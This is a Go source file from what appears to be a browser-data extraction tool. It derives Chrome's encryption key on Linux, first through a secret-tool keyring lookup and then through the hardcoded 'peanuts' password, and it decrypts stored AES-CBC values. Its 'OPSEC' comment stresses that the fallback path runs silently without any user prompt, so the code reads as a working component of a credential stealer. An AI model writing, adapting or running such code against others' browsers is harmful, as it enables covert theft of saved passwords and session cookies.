//go:build linux

package chromium

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha1"
	"fmt"
	"os/exec"
	"strings"

	"golang.org/x/crypto/pbkdf2"
)

// GetChromeKey retrieves and derives the AES-128 key on Linux.
//
// Linux uses a hardcoded default password "peanuts" with PBKDF2-SHA1
// (1 iteration). Optionally tries secret-tool (GNOME Keyring / KDE Wallet)
// first, falling back silently to the hardcoded key.
//
// OPSEC: The hardcoded "peanuts" path is SILENT (no prompt).
// The secret-tool path may trigger a desktop prompt on some configurations.
func GetChromeKey(allowPrompt bool) ([]byte, error) {
	password := "peanuts" // Chrome's hardcoded default on Linux.

	// Try secret-tool (GNOME Keyring / KDE Wallet) — silent fallback to peanuts.
	cmd := exec.Command("secret-tool", "lookup", "application", "chromium")
	out, err := cmd.Output()
	if err == nil {
		secretVal := strings.TrimSpace(string(out))
		if secretVal != "" {
			password = secretVal
		}
	}

	// Derive AES-128 key using PBKDF2-SHA1.
	// Parameters: salt="saltysalt", iterations=1, key length=16.
	key := pbkdf2.Key([]byte(password), []byte("saltysalt"), 1, 16, sha1.New)
	return key, nil
}

// DecryptAESCBC decrypts AES-128-CBC with PKCS7 padding.
// IV is 16 bytes of 0x20 (space character) — Chrome's convention.
// Same implementation as darwin — Chrome uses the same AES-CBC scheme.
func DecryptAESCBC(data, key []byte) (string, error) {
	if len(data) == 0 {
		return "", nil
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", fmt.Errorf("aes cipher: %w", err)
	}

	if len(data)%aes.BlockSize != 0 {
		return "", fmt.Errorf("ciphertext not a multiple of block size")
	}

	// IV = 16 bytes of space (0x20).
	iv := make([]byte, aes.BlockSize)
	for i := range iv {
		iv[i] = 0x20
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	plaintext := make([]byte, len(data))
	mode.CryptBlocks(plaintext, data)

	// Remove PKCS7 padding.
	plaintext, err = pkcs7Unpad(plaintext, aes.BlockSize)
	if err != nil {
		return "", fmt.Errorf("pkcs7 unpad: %w", err)
	}

	return string(plaintext), nil
}

// decryptPlatform dispatches to the linux AES-CBC decryptor.
func decryptPlatform(data, key []byte) (string, error) {
	return DecryptAESCBC(data, key)
}

// pkcs7Unpad removes PKCS7 padding from decrypted data.
func pkcs7Unpad(data []byte, blockSize int) ([]byte, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("empty data")
	}
	padLen := int(data[len(data)-1])
	if padLen == 0 || padLen > blockSize || padLen > len(data) {
		return nil, fmt.Errorf("invalid padding length %d", padLen)
	}
	for i := len(data) - padLen; i < len(data); i++ {
		if data[i] != byte(padLen) {
			return nil, fmt.Errorf("invalid padding byte at position %d", i)
		}
	}
	return data[:len(data)-padLen], nil
}
